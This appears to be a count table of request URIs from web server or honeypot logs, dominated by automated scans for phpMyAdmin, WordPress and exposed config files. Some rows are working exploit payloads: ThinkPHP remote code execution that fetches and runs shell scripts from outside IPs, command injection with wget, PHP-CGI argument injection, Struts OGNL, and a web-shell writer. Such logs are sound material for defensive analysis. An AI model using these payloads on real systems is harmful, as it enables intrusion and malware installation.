uri	uri_count
/TP/html/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP	13
/TP/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP	13
/TP/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP	13
/admin/phpMyAdmin/scripts/setup.php	13
/admindb/scripts/setup.php	13
/cgi-bin/php-cgi	13
/cgi-bin/php.cgi	13
/cgi-bin/php4	13
/html/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP	13
/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP	13
/phpMyAdmin-2.5.1/	13
/phpMyAdmin-2.5.4/	13
/phpMyAdmin-2.5.6/	13
/phpMyAdmin-2.6.0/	13
/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP	13
/thinkphp/html/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP	13
/thinkphp/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP	13
/.git/HEAD	12
/915E1C82875EB08BFE3D5B653EC5B170.php	12
/MySQL	12
/YesThisIsAReallyLongRequestURLbutWeAreDoingItOnPurposeWeAreScanningForResearchPurposePleaseHaveALookAtTheUserAgentTHXYesThisIsAReallyLongRequestURLbutWeAreDoingItOnPurposeWeAreScanningForResearchPurposePleaseHaveALookAtTheUserAgentTHXYesThisIsAReallyLongRequestURLbutWeAreDoingItOnPurposeWeAreScanningForResearchPurposePleaseHaveALookAtTheUserAgentTHXYesThisIsAReallyLongRequestURLbutWeAreDoingItOnPurposeWeAreScanningForResearchPurposePleaseHaveALookAtTheUserAgentTHXYesThisIsAReallyLongRequestURLbutWeAreDoingItOnPurposeWeAreScanningForResearchPurposePleaseHaveALookAtTheUserAgentTHXYesThisIsAReallyLongRequestURLbutWeAreDoingItOnPurposeWeAreScanningForResearchPurposePleaseHaveALookAtTheUserAgentTHXYesThisIsAReallyLongRequestURLbutWeAreDoingItOnPurposeWeAreScanningForResearchPurposePleaseHaveALookAtTheUserAgentTHXYesThisIsAReallyLongRequestURLbutWeAreDoingItOnPurposeWeAreScanningForResearchPurposePleaseHaveALookAtTheUserAgentTHXYesThisIsAReallyLongRequestURLbutWeAreDoingItOnPurposeWeAreScann	12
/cgi-bin/php5-cli	12
/cgi-sys/php5	12
/dumper	12
/index.do	12
/phpMyAdmin-2.6.2-rc1/	12
/phpMyAdmin/scripts/Setup.php	12
/phpMyAdmin/scripts/setup0.php	12
/phpMyAdmin/scripts/setup1.php	12
/phpMyAdmin_/scripts/setup.php	12
/phpmyadmin/scripts/Setup.php	12
/phpmyadmin/scripts/setup1.php	12
/phpmyadmin_/scripts/setup.php	12
/sftp-config.json	12
/Admin7388a552/Login.php	11
/asjc.php	11
/freebook.php	11
/goodbook.php	11
/haiyan.php	11
/indexl.php	11
/manager/text/list	11
/phpMyAdmin-2.2.3/	11
/phpMyAdmin-2.2.6/	11
/phpMyAdmin-2.5.5/	11
/phpMyAdmin-2.5.7/	11
/phpMyAdmin-2.6.0-pl1/	11
/phpMyAdmin-2.6.3-rc1/	11
/phpMyAdmin-2.8.1/	11
/phpMyAdmin-2.8.2/	11
/phpMyAdmin-2/	11
/phpMyAdmin-2/scripts/setup.php	11
/sql.php	11
/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_aja	11
/version	11
/websql/scripts/setup.php	11
	10
/SQLite/main.php	10
/Util/PHP/eval-stdin.php	10
/admin	10
/admin/pma/scripts/setup.php	10
/agSearch/SQlite/main.php	10
/cgi-bin-sdb/printenv	10
/invoker/JMXInvokerServlet	10
/phpMyAdmin-2.10.0.0/scripts/setup.php	10
/phpMyAdmin-3.0.0.0-all-languages/scripts/setup.php	10
/phpadmin/scripts/setup.php	10
/src/Util/PHP/eval-stdin.php	10
/struts2-rest-showcase/orders.xhtml	10
/test/sqlite/SQLiteManager-1.2.0/SQLiteManager-1.2.0/main.php	10
/user/register/	10
/web/scripts/setup.php	10
/webfig/roteros.info	10
/Dumper	9
/PMA	9
/PMA2005/	9
/bbs/index.php?routestring=ajax/render/widget_php	9
/cgi-bin/test-cgi.pl	9
/cgi-sys/entropysearch.cgi	9
/cgi-sys/suspendedpage.cgi	9
/current_config/passwd	9
/horde/imp/test.php	9
/horde3/imp/test.php	9
/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://81.6.42.123/a_thk.sh%20-O%20/tmp/a;%20chmod%200777%20/tmp/a;%20/tmp/a;	9
/p/m/a/	9
/phpMyAdmin-2.5.5-rc1/	9
/phpMyAdmin-2.5.6-rc1/	9
/phpMyAdmin-2.5.6-rc2/	9
/phpMyAdmin-2.5.7-pl1/	9
/phpMyAdmin-2.6.0-alpha2/	9
/phpMyAdmin-2.6.0-beta1/	9
/phpMyAdmin-2.6.0-beta2/	9
/phpMyAdmin-2.6.0-pl2/	9
/phpMyAdmin-2.6.0-pl3/	9
/phpMyAdmin-2.6.0-rc1/	9
/phpMyAdmin-2.6.0-rc2/	9
/phpMyAdmin-2.6.1-pl1/	9
/phpMyAdmin-2.6.1-pl3/	9
/phpMyAdmin-2.6.1-rc1/	9
/phpMyAdmin-2.6.1-rc2/	9
/phpMyAdmin-2.6.1/	9
/phpMyAdmin-2.6.2/	9
/phpMyAdmin-2.6.3-pl1/	9
/phpMyAdmin-2.6.4-pl1/	9
/phpMyAdmin-2.6.4-pl3/	9
/phpMyAdmin-2.6.4-pl4/	9
/phpMyAdmin-2.6.4/	9
/phpMyAdmin-2.7.0/	9
/phpMyAdmin-2.8.0.1/	9
/phpMyAdmin-2.8.0.2/	9
/phpMyAdmin-2.8.0.3/	9
/phpMyAdmin-2.8.0.4/	9
/phpMyAdmin-2.8.0/	9
/phpMyAdmin-2.8.1-rc1/	9
/phpmyadmin/scripts/setup0.php	9
/phppath/php-cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E	9
/pma2005/	9
/public/index.php?s=index\/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1	9
/solr/	9
/upload/bank-icons/bank-gh.jpg	9
/.git/index	8
/Blog/wp-login.php	8
/Wordpress/wp-login.php	8
/cgi-bin/test.sh	8
/cgi-bin/test/test.cgi	8
/cgi-sys/redirect.cgi	8
/cgi-sys/test-cgi	8
/console/login/LoginForm.jsp	8
/dbadmin	8
/dump	8
/hudson/login	8
/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP	8
/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=%3Becho%20-n%20HellorConfig%7Cmd5sum%20%23	8
/jenkins/login	8
/msd1.21	8
/mySQLmanager	8
/mysqldump	8
/pHpMyAdMiN/scripts/setup.php	8
/phpMyAdmin-4/	8
/recordings/index.php	8
/struts2-bootstrap-showcase/	8
/struts2-bootstrap-showcase/index.action	8
/struts2-showcase/index.action	8
/struts2-showcase/titles/index.action	8
/upload/bank-icons/bank_16.png	8
/CHANGELOG.txt	7
/a2billing/admin/Public/PP_error.php?c=accessdenied	7
/a2billing/agent/Public/index.php	7
/admin/Token7388a552.asp	7
/axis-cgi/jpg/image.cgi	7
/bbs.php?routestring=ajax/render/widget_php	7
/forum.php?routestring=ajax/render/widget_php	7
/forum/index.php?routestring=ajax/render/widget_php	7
/forums.php?routestring=ajax/render/widget_php	7
/forums/index.php?routestring=ajax/render/widget_php	7
/index.jsp	7
/library/firstDetect.js.php	7
/meijianxue	7
/msddump	7
/msddumper	7
/msdump	7
/p/m/a/scripts/setup.php	7
/php/phpmyadmin/scripts/setup.php	7
/phpMyAdmin-2.5.5-pl1/	7
/phpMyAdmin-2.5.5-rc2/	7
/phpMyAdmin-2.6.0-alpha/	7
/phpMyAdmin-2.6.0-rc3/	7
/phpMyAdmin-2.6.1-pl2/	7
/phpMyAdmin-2.6.2-beta1/	7
/phpMyAdmin-2.6.2-pl1/	7
/phpMyAdmin-2.6.4-pl2/	7
/phpMyAdmin-2.6.4-rc1/	7
/phpMyAdmin-2.7.0-beta1/	7
/phpMyAdmin-2.7.0-pl1/	7
/phpMyAdmin-2.7.0-pl2/	7
/phpMyAdmin-2.7.0-rc1/	7
/phpMyAdmin-2.8.0-beta1/	7
/phpMyAdmin-2.8.0-rc1/	7
/phpMyAdmin-2.8.0-rc2/	7
/remote/login	7
/sqladmin/scripts/setup.php	7
/web/phpMyAdmin/scripts/setup.php	7
/winbox.png	7
/1phpmyadmin/	6
/2ndex.php	6
/3phpmyadmin/	6
/4phpmyadmin/	6
/7388A552.php	6
/PMA2009/	6
/SQLite/SQLiteManager-1.2.4/main.php	6
/admin/images/tango.png	6
/admin/wp-login.php	6
/api/v1	6
/common/info.cgi	6
/evox/about	6
/gotemp.php	6
/jexinv3/jexinv3.jsp?ppp=echo%20D3c3mb3r	6
/jexinv4/jexinv4.jsp?ppp=echo%20D3c3mb3r	6
/jexws3/jexws3.jsp?ppp=echo%20D3c3mb3r	6
/jexws4/jexws4.jsp?ppp=echo%20D3c3mb3r	6
/login?from=%2F	6
/login_sid.lua	6
/myadminphp/	6
/news/wp-login.php	6
/php/scripts/setup.php	6
/phpMyAdmin-2.11.5.1-all-languages/	6
/phpMyAdmin-2.11.6-all-languages/	6
/phpMyAdmin-2.11.7.1-all-languages-utf-8-only/	6
/phpMyAdmin-2.11.7.1-all-languages/	6
/phpMyAdmin-2.11.8.1-all-languages-utf-8-only/	6
/phpMyAdmin-2.11.8.1-all-languages/	6
/phpMyAdmin-4.6.4/	6
/phpmyadmin/admin/	6
/phpmyadmin1/	6
/phppath/php.cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E	6
/phppath/php4?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E	6
/phppath/php5?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E	6
/pma2009/	6
/sadad24	6
/services/MyICOffice/	6
/sql/phpMyAdmin3/	6
/sql/phpMyAdmin4/	6
/sql/phpmyadmin3/	6
/sql/phpmyadmin4/	6
/stuff.php	6
/webdb/scripts/setup.php	6
/wordpress2/wp-login.php	6
/.ftpconfig	5
/000000000000.cfg	5
/1/wp-login.php	5
/Admin	5
/CGI/Execute	5
/DAF301ED21CACF64EC9684D216C86D37.php	5
/DB	5
/MyAdmin	5
/blog/phpmyadmin/scripts/setup.php	5
/cgi-bin/user/Config.cgi?.cab&action=get&category=Account.*	5
/cgi-sys/realsignup.cgi	5
/downloader/	5
/forum/wp-login.php	5
/hedwig.cgi	5
/images.php	5
/jexinv/jexinv.jsp?ppp=echo%20D3c3mb3r	5
/jexsw2/jexsw2.jsp?ppp=echo%20D3c3mb3r	5
/jexws2/jexws2.jsp?ppp=echo%20D3c3mb3r	5
/login.html	5
/mysqlmanager/scripts/setup.php	5
/phpMyAdmin-2.11.11.3/scripts/setup.php	5
/phpMyAdmin-2.11.11/scripts/setup.php	5
/phpMyAdmin/setup.php	5
/phpMyAdmin3/scripts/setup.php	5
/phpmy-admin/scripts/setup.php	5
/register.jsp	5
/shell?%75%6E%61%6D%65%20%2D%61	5
/sqlmanager	5
/stalker_portal/server/adm/tv-channels/iptv-list-json	5
/tmUnblock.cgi	5
/vendor/phpunit/phpunit/src/Util/Filereader.php?task=a	5
/wallet.dat	5
/webadmin/scripts/setup.php	5
/webdav	5
/websql	5
/wordpress1/wp-login.php	5
/wp-content/plugins/portable-phpmyadmin/wp-pma-mod/	5
/.svn/entries	4
/.vscode/ftp-sync.json	4
/001565000000.cfg	4
/2/wp-login.php	4
/3/wp-login.php	4
/7788.php	4
/8899.php	4
/DBAdmin	4
/DBadmin	4
/HNAP1	4
/MAPI/API	4
/MYAdmin	4
/MYadmin	4
/MySQLDumper/main.php	4
/MySQLManager	4
/MySqlManager	4
/PHPMYADMIN	4
/PMA2005	4
/PMA2006	4
/WordPress/wp-login.php	4
/_PHPMYADMIN/scripts/setup.php	4
/_my_sql_tool_	4
/_pHpMyAdMiN/scripts/setup.php	4
/_phpmyadmin	4
/aastra/	4
/admin.php	4
/administrator/components/com_joommyadmin/phpmyadmin/scripts/setup.php	4
/api/.env	4
/blog/robots.txt	4
/cm/	4
/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php	4
/components/com_jbcatalog/libraries/jsupload/server/php	4
/cpanel	4
/dbAdmin	4
/dbmanager	4
/dbweb	4
/drupal7/	4
/host/	4
/index.htm	4
/index.html	4
/invoker/readonly	4
/jmx-console/	4
/localhost/	4
/login.cgi?cli=aa%20aa%27;wget%20http://128.199.251.119/t.php%27$	4
/msd1.24stable/main.php	4
/my/scripts/setup.php	4
/myAdmin	4
/mySQL	4
/mySql	4
/mySqlDumper/main.php	4
/mysqladmin	4
/nx8j78af1b.jsp	4
/php-myadmin	4
/phpMyAdmin-2.10.0/scripts/setup.php	4
/phpMyAdmin-2.11.1-all-languages/scripts/setup.php	4
/phpMyAdmin-2.6.4-pl3/scripts/setup.php	4
/phppgadmin/	4
/polycom/	4
/prov/	4
/provision/	4
/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php	4
/pv/000000000000.cfg	4
/servlet?m=mod_listener&p=login&q=loginForm&jumpto=status	4
/shop/wp-login.php	4
/sip.cfg	4
/site/wp-login.php	4
/sql/main.php	4
/sqladm/scripts/setup.php	4
/sqladmin	4
/sqlweb	4
/typo3/phpmyadmin/scripts/setup.php	4
/user.txt	4
/user/login	4
/user/soapCaller.bs	4
/vendor/phpunit/phpunit/src/Util/Filter.php	4
/wls-wsat/CoordinatorPortType?wsdl	4
/wp1/wp-login.php	4
/xmlrpc.php?rsd	4
/yealink/	4
/yealink/y000000000000.cfg	4
/zabbix/jsrpc.php	4
/%2525%257b%28%2523dm%253d%2540ognl.OgnlContext%2540DEFAULT_MEMBER_ACCESS%29.%28%2523_memberAccess%253f%28%2523_memberAccess%253d%2523dm%29%253a%28%28%2523container%253d%2523context%255b%2527com.opensymphony.xwork2.ActionContext.container%2527%255d%29.%28%2523ognlUtil%253d%2523container.getInstance%28%2540com.opensymphony.xwork2.ognl.OgnlUtil%2540class%29%29.%28%2523ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%2523ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%2523context.setMemberAccess%28%2523dm%29%29%29%29.%28%2523res%253d%2540org.apache.struts2.ServletActionContext%2540getResponse%28%29%29.%28%2523res.addHeader%28%2527eresult%2527%252c%2527struts2_security_check%2527%29%29%257d/login.action	3
/.remote-sync.json	3
/Admin/import.php	3
/DB/import.php	3
/DBAdmin/import.php	3
/DBadmin/import.php	3
/MYAdmin/import.php	3
/MYadmin/import.php	3
/MyAdmin/import.php	3
/MySQL/scripts/setup.php	3
/MySQLManager/import.php	3
/MySqlManager/import.php	3
/OWA-AUTODISCOVER-EWS	3
/PHPMYADMIN/import.php	3
/PMA/import.php	3
/PMA2005/import.php	3
/PMA2005/scripts/setup.php	3
/PMA2006/import.php	3
/PSIA/index	3
/PhPmyadmin	3
/Phpmyadmin	3
/SQL/scripts/setup.php	3
/System/Security/hylogin.aspx	3
/_VTI_BIN/WSTS	3
/_my_sql_tool_/import.php	3
/_phpmyadmin/import.php	3
/aastra.cfg	3
/admin/ajax.php	3
/admin/import.php	3
/administrator/components/com_extplorer/uploadhandler.php	3
/administrator/components/com_rokdownloads/assets/uploadhandler.php	3
/api/v1/pod	3
/apple-touch-icon-precomposed.png	3
/apple-touch-icon.png	3
/blog/	3
/blog/wp-includes/wlwmanifest.xml	3
/cgi-bin/cgi_wrapper?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E	3
/cgi-sys/defaultwebpage.cgi	3
/components/com_facileforms/libraries/jquery/uploadify.php	3
/configuracion/phpmyadmin/scripts/setup.php	3
/cpadmin/scripts/setup.php	3
/data/admin/ver.txt	3
/data/admin/verifies.txt	3
/dbAdmin/import.php	3
/dbadmin/import.php	3
/dbmanager/import.php	3
/dbweb/import.php	3
/deployment-config.json	3
/device_description.xml	3
/elastix_warning_authentication.php	3
/external.php	3
/fdsrwe	3
/feed/	3
/home.asp	3
/iem/admin/index.php	3
/image.php	3
/in.php	3
/index.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%506	3
/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://82.212.70.218/a_thk.sh%20-O%20/tmp/a;%20chmod%200777%20/tmp/a;%20/tmp/a;	3
/index_style.css	3
/jetspeed/portal/	3
/login.asp	3
/main.jsp	3
/msdn.cpp	3
/myAdmin/import.php	3
/mySQL/import.php	3
/mySQLmanager/import.php	3
/mySql/import.php	3
/myadmin/import.php	3
/mysite/wp-login.php	3
/mysql-admin/scripts/setup.php	3
/mysqladmin/import.php	3
/mysqlmanager	3
/mysqlmanager/import.php	3
/new/wp-login.php	3
/p/m/a	3
/p/m/a/import.php	3
/pMA	3
/pMA/import.php	3
/pMA2005	3
/pMA2005/import.php	3
/pMA2006	3
/pMA2006/import.php	3
/phone1.cfg	3
/php-my-admin	3
/php-my-admin/import.php	3
/php-myadmin/import.php	3
/php-myadmin/scripts/setup.php	3
/phpMA	3
/phpMA/import.php	3
/phpMa	3
/phpMa/import.php	3
/phpMyAdmin-1.1.0	3
/phpMyAdmin-1.1.0/import.php	3
/phpMyAdmin-1.3.0	3
/phpMyAdmin-1.3.0/import.php	3
/phpMyAdmin-2.0.5	3
/phpMyAdmin-2.0.5/import.php	3
/phpMyAdmin-2.1.0	3
/phpMyAdmin-2.1.0/import.php	3
/phpMyAdmin-2.10.0	3
/phpMyAdmin-2.10.0-beta1	3
/phpMyAdmin-2.10.0-beta1/import.php	3
/phpMyAdmin-2.10.0-rc1	3
/phpMyAdmin-2.10.0-rc1/import.php	3
/phpMyAdmin-2.10.0.1	3
/phpMyAdmin-2.10.0.1/import.php	3
/phpMyAdmin-2.10.0.2	3
/phpMyAdmin-2.10.0.2/import.php	3
/phpMyAdmin-2.10.0/import.php	3
/phpMyAdmin-2.10.1	3
/phpMyAdmin-2.10.1-rc1	3
/phpMyAdmin-2.10.1-rc1/import.php	3
/phpMyAdmin-2.10.1/import.php	3
/phpMyAdmin-2.10.2	3
/phpMyAdmin-2.10.2-rc1	3
/phpMyAdmin-2.10.2-rc1/import.php	3
/phpMyAdmin-2.10.2/import.php	3
/phpMyAdmin-2.10.3	3
/phpMyAdmin-2.10.3-rc1	3
/phpMyAdmin-2.10.3-rc1/import.php	3
/phpMyAdmin-2.10.3/import.php	3
/phpMyAdmin-2.11.0	3
/phpMyAdmin-2.11.0-beta1	3
/phpMyAdmin-2.11.0-beta1/import.php	3
/phpMyAdmin-2.11.0-rc1	3
/phpMyAdmin-2.11.0-rc1/import.php	3
/phpMyAdmin-2.11.0-rc2	3
/phpMyAdmin-2.11.0-rc2/import.php	3
/phpMyAdmin-2.11.0/import.php	3
/phpMyAdmin-2.11.1	3
/phpMyAdmin-2.11.1-rc1	3
/phpMyAdmin-2.11.1-rc1/import.php	3
/phpMyAdmin-2.11.1.1	3
/phpMyAdmin-2.11.1.1/import.php	3
/phpMyAdmin-2.11.1.2	3
/phpMyAdmin-2.11.1.2/import.php	3
/phpMyAdmin-2.11.1/import.php	3
/phpMyAdmin-2.11.10.1	3
/phpMyAdmin-2.11.10.1/import.php	3
/phpMyAdmin-2.11.11-rc1	3
/phpMyAdmin-2.11.11-rc1/import.php	3
/phpMyAdmin-2.11.11.1	3
/phpMyAdmin-2.11.11.1/import.php	3
/phpMyAdmin-2.11.11.2	3
/phpMyAdmin-2.11.11.2/import.php	3
/phpMyAdmin-2.11.11.3/import.php	3
/phpMyAdmin-2.11.11/import.php	3
/phpMyAdmin-2.11.2-rc1/import.php	3
/phpMyAdmin-2.11.2.1/import.php	3
/phpMyAdmin-2.11.2.2/import.php	3
/phpMyAdmin-2.11.2/import.php	3
/phpMyAdmin-2.11.3-rc1/import.php	3
/phpMyAdmin-2.11.3/import.php	3
/phpMyAdmin-2.11.4-rc1/import.php	3
/phpMyAdmin-2.11.4/import.php	3
/phpMyAdmin-2.11.5-all-languages/import.php	3
/phpMyAdmin-2.11.5-rc1/import.php	3
/phpMyAdmin-2.11.5.1/import.php	3
/phpMyAdmin-2.11.5.2/import.php	3
/phpMyAdmin-2.11.5/import.php	3
/phpMyAdmin-2.11.6-rc1/import.php	3
/phpMyAdmin-2.11.6/import.php	3
/phpMyAdmin-2.11.7-rc1/import.php	3
/phpMyAdmin-2.11.7-rc2/import.php	3
/phpMyAdmin-2.11.7.1/import.php	3
/phpMyAdmin-2.11.7/import.php	3
/phpMyAdmin-2.11.8-rc1/import.php	3
/phpMyAdmin-2.11.8.1/import.php	3
/phpMyAdmin-2.11.8/import.php	3
/phpMyAdmin-2.11.9.1/import.php	3
/phpMyAdmin-2.11.9.2/import.php	3
/phpMyAdmin-2.11.9.4/import.php	3
/phpMyAdmin-2.11.9.5/import.php	3
/phpMyAdmin-2.11.9.6/import.php	3
/phpMyAdmin-2.11.9/import.php	3
/phpMyAdmin-2.2.3/import.php	3
/phpMyAdmin-2.2.6/import.php	3
/phpMyAdmin-2.5.1/import.php	3
/phpMyAdmin-2.5.4/import.php	3
/phpMyAdmin-2.5.5-pl1/import.php	3
/phpMyAdmin-2.5.5-rc1/import.php	3
/phpMyAdmin-2.5.5-rc2/import.php	3
/phpMyAdmin-2.5.5/import.php	3
/phpMyAdmin-2.5.6-rc1/import.php	3
/phpMyAdmin-2.5.6-rc2/import.php	3
/phpMyAdmin-2.5.6/import.php	3
/phpMyAdmin-2.5.7-pl1/import.php	3
/phpMyAdmin-2.5.7/import.php	3
/phpMyAdmin-2.6.0-alpha/import.php	3
/phpMyAdmin-2.6.0-alpha2/import.php	3
/phpMyAdmin-2.6.0-beta1/import.php	3
/phpMyAdmin-2.6.0-beta2/import.php	3
/phpMyAdmin-2.6.0-pl1/import.php	3
/phpMyAdmin-2.6.0-pl2/import.php	3
/phpMyAdmin-2.6.0-pl3/import.php	3
/phpMyAdmin-2.6.0-rc1/import.php	3
/phpMyAdmin-2.6.0-rc2/import.php	3
/phpMyAdmin-2.6.0-rc3/import.php	3
/phpMyAdmin-2.6.0/import.php	3
/phpMyAdmin-2.6.1-pl1/import.php	3
/phpMyAdmin-2.6.1-pl2/import.php	3
/phpMyAdmin-2.6.1-pl3/import.php	3
/phpMyAdmin-2.6.1-rc1/import.php	3
/phpMyAdmin-2.6.1-rc2/import.php	3
/phpMyAdmin-2.6.1/import.php	3
/phpMyAdmin-2.6.2-beta1/import.php	3
/phpMyAdmin-2.6.2-pl1/import.php	3
/phpMyAdmin-2.6.2-rc1/import.php	3
/phpMyAdmin-2.6.2/import.php	3
/phpMyAdmin-2.6.3-pl1/import.php	3
/phpMyAdmin-2.6.3-rc1/import.php	3
